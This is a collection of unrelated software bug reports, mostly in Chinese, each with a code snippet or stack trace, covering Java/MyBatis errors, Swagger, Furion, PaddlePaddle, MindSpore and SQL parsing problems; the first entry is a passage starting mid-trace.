at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:478) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:80) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:799) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1457) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-8.5.20.jar:8.5.20] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [?:1.8.0_221] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [?:1.8.0_221] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-8.5.20.jar:8.5.20] at java.lang.Thread.run(Thread.java:748) [?:1.8.0_221] Caused by: org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 ### The error may exist in mapper\TaosDataEvent.Mapper.xml ### The error may involve com.ccpiot.taosdata.dao.TaosDataEventDao.listDeviceCommandInvocations_mpCount ### The error occurred while handling results ### SQL: SELECT COUNT(*) FROM Event WHERE tenant_Id = ? AND event_Type = ? AND device_Assignment_Token = ? ### Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:30) ~[mybatis-3.5.6.jar:3.5.6] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:149) ~[mybatis-3.5.6.jar:3.5.6] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) ~[mybatis-3.5.6.jar:3.5.6] at sun.reflect.GeneratedMethodAccessor42.invoke(Unknown Source) ~[?:?] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_221] at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_221] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:426) ~[mybatis-spring-2.0.5.jar:2.0.5] ... 122 more Caused by: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 at java.util.ArrayList.rangeCheck(ArrayList.java:657) ~[?:1.8.0_221] at java.util.ArrayList.get(ArrayList.java:433) ~[?:1.8.0_221] at com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor.willDoQuery(PaginationInnerInterceptor.java:134) ~[mybatis-plus-extension-3.4.1.jar:3.4.1] at com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor.intercept(MybatisPlusInterceptor.java:59) ~[mybatis-plus-extension-3.4.1.jar:3.4.1] at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) ~[mybatis-3.5.6.jar:3.5.6] at com.sun.proxy.$Proxy80.query(Unknown Source) ~[?:?] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:147) ~[mybatis-3.5.6.jar:3.5.6] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) ~[mybatis-3.5.6.jar:3.5.6] at sun.reflect.GeneratedMethodAccessor42.invoke(Unknown Source) ~[?:?] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_221] at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_221] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:426) ~[mybatis-spring-2.0.5.jar:2.0.5] ... 122 more 2021-01-25T11:05:58,980 [http-nio-8089-exec-10] ERROR [RestController] Unhandled runtime exception. org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 ### The error may exist in mapper\TaosDataEvent.Mapper.xml ### The error may involve com.ccpiot.taosdata.dao.TaosDataEventDao.listDeviceCommandInvocations_mpCount ### The error occurred while handling results ### SQL: SELECT COUNT(*) FROM Event WHERE tenant_Id = ? AND event_Type = ? AND device_Assignment_Token = ? ### Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:92) ~[mybatis-spring-2.0.5.jar:2.0.5] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:440) ~[mybatis-spring-2.0.5.jar:2.0.5] at com.sun.proxy.$Proxy53.selectList(Unknown Source) ~[?:?] at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:223) ~[mybatis-spring-2.0.5.jar:2.0.5] at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:147) ~[mybatis-3.5.6.jar:3.5.6] at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:80) ~[mybatis-3.5.6.jar:3.5.6] at org.apache.ibatis.binding.MapperProxy$PlainMethodInvoker.invoke(MapperProxy.java:152) ~[mybatis-3.5.6.jar:3.5.6] at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:85) ~[mybatis-3.5.6.jar:3.5.6] at com.sun.proxy.$Proxy83.listDeviceCommandInvocations(Unknown Source) ~[?:?] at com.ccpiot.taosdata.service.MyBatisTaosDataDeviceEventManagement.listDeviceCommandInvocations(MyBatisTaosDataDeviceEventManagement.java:550) ~[classes/:?] at com.ccpiot.device.DeviceEventManagementDecorator.listDeviceCommandInvocations(DeviceEventManagementDecorator.java:355) ~[classes/:?] at com.ccpiot.web.rest.controllers.AssignmentsController.listCommandInvocations(AssignmentsController.java:907) ~[classes/:?] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_221] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_221] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_221] at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_221] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) ~[spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133) ~[spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97) ~[spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827) ~[spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738) ~[spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85) ~[spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:687) [javax.servlet-api-3.1.0.jar:3.1.0] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846) [spring-webmvc-4.3.11.RELEASE.jar:4.3.11.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:790) [javax.servlet-api-3.1.0.jar:3.1.0] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:96) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at com.ccpiot.web.filters.JsonpFilter.doFilter(JsonpFilter.java:86) [classes/:?] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at com.ccpiot.web.filters.NoCacheFilter.doFilterInternal(NoCacheFilter.java:38) [classes/:?] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at com.ccpiot.web.filters.ResponseTimerFilter.doFilterInternal(ResponseTimerFilter.java:42) [classes/:?] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at com.ccpiot.web.filters.MethodOverrideFilter.doFilterInternal(MethodOverrideFilter.java:42) [classes/:?] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.session.web.http.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:74) [spring-session-1.3.0.RELEASE.jar:?] at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:262) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) [tomcat-embed-core-8.5.20.jar:8.5.20] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:317) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:114) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilterInternal(BasicAuthenticationFilter.java:215) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:64) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:331) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56) [spring-security-web-4.2.3.RELEASE.jar:4.2.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-4.3.11.RELEASE.jar:4.3.11.RELEASE] at org.springframework.security.w"
当两个applicaion里面有相同的实体名时生成swaager时会出错,"确认工单   <code>: ---&gt; System.InvalidOperationException: Can't use schemaId ""$Staff"" for type ""$ZaoJia.Application.Staff"". The same schemaId is already used for type ""$JianLi.Application.Staff"""
事件总线DB执行问题,"Furion 版本号 4.6.0 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 发生了什么？ 事件总线调用Service执行数据库修改未生效 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则将无法得到答复。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: public class ToDoEventSubscriber : IEventSubscriber { private readonly ILogger&lt;ToDoEventSubscriber&gt; _logger; public ToDoEventSubscriber(ILogger&lt;ToDoEventSubscriber&gt; logger) { _logger = logger; } [EventSubscribe(""ToDo:Create"")] public async Task CreateToDo(EventHandlerExecutingContext context) { var todo = context.Source; _logger.LogInformation(""创建一个 ToDo：{Name}"", todo.Payload); await Scoped.CreateUowAsync(async (factory, scope) =&gt; { var _service = scope.ServiceProvider.GetRequiredService&lt;ToDoService&gt;(); await _service.ToDo(); }); } } public class ToDoService : ITransient { public async Task ToDo() { //懒人sql出错 无法打印出数据 var data = await ""select 1"".SqlQueryAsync(); Console.WriteLine(data); //修改数据库字段数据没有变更 可以正常执行 查询可以正常查出数据 //var _rep = Db.GetRepository&lt;Entity&gt;(); //await _rep.UpdateNowAsync(entity); } }"
大量图片/文件应用场景，api需要返回304 Not Modified头以节省流量，目前没有好办法,"setStatus或sendError都不行，后端不会报错，但浏览器端经常报错   <code>: if (request.getHeaders(""If-None-Match"") != null) { // 直接返回 304 未修改 // response.getResponse().setStatus(304); response.getResponse().sendError(304, 'Not Modified'); return response.end(); }"
se_resnext run with fluid get error,"detail error is: OS: docker ubuntu 16.04 PaddlePaddle: GPU-latest Run Fluid with 4 Trainer and 4 Pserver Code: https://github.com/seiriosPlus/fluid_benchmark/blob/master/image_classification/se_resnext_cluster.py   <code>: E0402 06:16:52.417307 862 grpc_client.cc:189] proc param error:name:[batch_norm_0.b_0@GRAD.trainer_0] ep:[127.0.0.1:6170] grpc error:Connect Failed Traceback (most recent call last): File ""/models/image_classification/se_resnext_cluster.py"", line 316, in &lt;module&gt; layers=layers) File ""/models/image_classification/se_resnext_cluster.py"", line 241, in train fetch_list=[avg_cost, acc_top1, acc_top5]) File ""/usr/local/lib/python2.7/dist-packages/paddle/fluid/executor.py"", line 373, in run self.executor.run(program.desc, scope, 0, True, True) paddle.fluid.core.EnforceNotMet: at [/paddle/paddle/fluid/operators/send_op.cc:82] PaddlePaddle Call Stacks: 0 0x7f4a4928f542p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 482 1 0x7f4a498b61d8p paddle::operators::SendOp::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 4488 2 0x7f4a49907574p paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) + 52 3 0x7f4a49314252p paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool) + 1138 4 0x7f4a49315119p paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool) + 89 5 0x7f4a492a2491p void pybind11::cpp_function::initialize&lt;pybind11::cpp_function::initialize&lt;void, paddle::framework::Executor, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::Executor::*)(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::{lambda(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool)#1}, void, paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(pybind11::cpp_function::initialize&lt;void, paddle::framework::Executor, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::Executor::*)(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::{lambda(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool)#1}&amp;&amp;, void (*)(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::{lambda(pybind11::detail::function_call&amp;)#3}::_FUN(pybind11::detail::function_call) + 545 6 0x7f4a4929c452p pybind11::cpp_function::dispatcher(_object*, _object*, _object*) + 2338 7 0x4c37edp PyEval_EvalFrameEx + 31165 8 0x4b9ab6p PyEval_EvalCodeEx + 774 9 0x4c16e7p PyEval_EvalFrameEx + 22711 10 0x4b9ab6p PyEval_EvalCodeEx + 774 11 0x4c16e7p PyEval_EvalFrameEx + 22711 12 0x4b9ab6p PyEval_EvalCodeEx + 774 13 0x4eb30fp 14 0x4e5422p PyRun_FileExFlags + 130 15 0x4e3cd6p PyRun_SimpleFileExFlags + 390 16 0x493ae2p Py_Main + 1554 17 0x7f4a92ff5830p __libc_start_main + 240 18 0x4933e9p _start + 41"
Long类型精度丢失问题,"版本号：所有版本 后端通过json传递long类型数据给前台，会精度丢失。 建议添加转换long为string 暂无 友情提示： 未按格式要求发帖，会直接删掉。   <code>: /** * 解决long 序列化后传递到前台精度丢失问题。 * @author carl */ @EnableWebMvc @Configuration public class WebJsonConverterConfig implements WebMvcConfigurer { @Override public void configureMessageConverters(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters) { MappingJackson2HttpMessageConverter jackson2HttpMessageConverter = new MappingJackson2HttpMessageConverter(); ObjectMapper objectMapper = new ObjectMapper(); SimpleModule simpleModule = new SimpleModule(); simpleModule.addSerializer(Long.class, ToStringSerializer.instance); simpleModule.addSerializer(Long.TYPE, ToStringSerializer.instance); objectMapper.registerModule(simpleModule); jackson2HttpMessageConverter.setObjectMapper(objectMapper); converters.add(jackson2HttpMessageConverter); } }"
3.3.1属性字段规则使用了表名规则BUG?,"当前使用版本 mybatisplus-generator-3.3.1 com.baomidou.mybatisplus.generator.config.builder.ConfigBuilder.convertTableFields(TableInfo, StrategyConfig) 行数: 653 field.setPropertyName(strategyConfig, processName(field.getName(), config.getNaming())); 属性的名称使用命名规则应该是columnNaming 即使用方法config.getColumnNaming()   <code>: /** * 数据库表映射到实体的命名策略 */ private NamingStrategy naming = NamingStrategy.no_change; /** * 数据库表字段映射到实体的命名策略 * &lt;p&gt;未指定按照 naming 执行&lt;/p&gt; */ private NamingStrategy columnNaming = null;"
[CT][MS][addmv]  API has some issues,"addmv API 部分描述有点问题 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph addmv 接口描述 检查 API描述 接口描述清晰，完整， 正确 1.alpha， beta 接口描述不完整， 请确认支持类型范围， 且同时补充测试（含正反向验证）， 比如number中复数类型 2.如果alpha， beta支持list以及tuple， 请说明支持的长度以及里面的数据类型， 以及数据之间的约束关系 3.alpha , beta 没有列默认值 4. 输出没有说明dtype   <code>: Args: x (Tensor): Vector to be added. The shape of the tensor is :math:`(N,)`. mat (Tensor): The first tensor to be multiplied. The shape of the tensor is :math:`(N, M)`. vec (Tensor): The second tensor to be multiplied. The shape of the tensor is :math:`(M,)`. beta (Number): Multiplier for `x` (β). alpha (Number): Multiplier for `vec1` @ `vec2` (α). Outputs: Tensor, the shape of the output tensor is :math:`(N,)`."
[ST][MS][NET][LeNet][MAC]FPS[2852] can not reach 3000,"LeNet网络在MAC环境训练，性能2852/fps达不到3000 / 硬件环境: /device CPU（MAC） : -- MindSpore version :r1.8 commit_id:3232a15b -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_lenet_mnist_train_infer_0001.py get code from models python train.py 网络训练成功，性能精度达标 走给梁浩   <code>: epoch time: 21507.126 ms, per step time: 11.470 ms epoch time: 21006.029 ms, per step time: 11.203 ms epoch time: 21045.088 ms, per step time: 11.224 ms epoch time: 21031.871 ms, per step time: 11.217 ms epoch time: 21066.548 ms, per step time: 11.235 ms epoch time: 21069.372 ms, per step time: 11.237 ms epoch time: 21054.113 ms, per step time: 11.229 ms epoch time: 21017.190 ms, per step time: 11.209 ms epoch time: 21034.751 ms, per step time: 11.219 ms epoch time: 21009.997 ms, per step time: 11.205 ms"
resize_bilinear输出的shape问题,"在使用resize_bilinear的时候，下面的代码输出的shape是(50,1,40,40)，但是我看官网说明是以actual_shape为准的，所以不知道是不是自己写的有问题。 我在训练的时候，如果将数据喂进去之后，再去实时查看shape的话，输出的shape又是以actual_shape为准，所以对这一块有疑惑，不知道是否是resize_bilinear在build model的时候有问题呢？   <code>: import paddle import paddle.fluid as fluid a = fluid.layers.fill_constant(shape=[50,1,20,20], value=0, dtype='int64') shape_a = fluid.layers.shape( a ) shape_nc, shape_hw = fluid.layers.split(shape_a, num_or_sections=[2,2]) output = fluid.layers.resize_bilinear(a, scale=2.0, actual_shape=shape_hw) print( output.shape )"
Sql parse bug,"version: 1.0.0-rc.0 SQL:SELECT * FROM ( SELECT hotel_id,date_format(biz_date,'%Y-%m-%d') biz_date ,,day FROM gc_gxpms_rep_jour_history a WHERE hotel_group_id = 2 AND is_show = 'T' and = '000009' and hotel_id = $hotel_id$ and biz_date between DATE_ADD(curdate(),interval -day(curdate())+1 day) and LAST_DAY(curdate) order by biz_date union all SELECT hotel_id,date_format(biz_date,'%Y-%m-%d') biz_date ,,day FROM gc_lspms_rep_jour_history WHERE hotel_group_id = 2 AND is_show = 'T' and = '000009' and hotel_id = $hotel_id$ and biz_date between DATE_ADD(curdate(),interval -day(curdate())+1 day) and LAST_DAY(curdate) order by biz_date ) AS LIMIT 1000 OFFSET 0 DB: MYSQL EXCEPTION:org.apache.calcite.sql.parser.SqlParseException: Encountered ""day FROM"" at line 1, column 84. Was expecting one of: ""CURSOR"" ... ""EXISTS"" ... ""NOT"" ... ""ROW"" ... ""("" ... ""+"" ... ""-"" ... ""INTERVAL"" ... &lt;UNSIGNED_INTEGER_LITERAL&gt; ... &lt;DECIMAL_NUMERIC_LITERAL&gt; ... &lt;APPROX_NUMERIC_LITERAL&gt; ... &lt;BINARY_STRING_LITERAL&gt; ... &lt;PREFIXED_STRING_LITERAL&gt; ... &lt;QUOTED_STRING&gt; ... &lt;UNICODE_STRING_LITERAL&gt; ... &lt;BIG_QUERY_DOUBLE_QUOTED_STRING&gt; ... &lt;BIG_QUERY_QUOTED_STRING&gt; ... ""TRUE"" ... ""FALSE"" ... ""UNKNOWN"" ... ""NULL"" ... &lt;LBRACE_D&gt; ... &lt;LBRACE_T&gt; ... &lt;LBRACE_TS&gt; ... ""DATE"" ... ""TIME"" ... ""TIMESTAMP"" ... ""?"" ... ""CAST"" ... ""EXTRACT"" ... ""POSITION"" ... 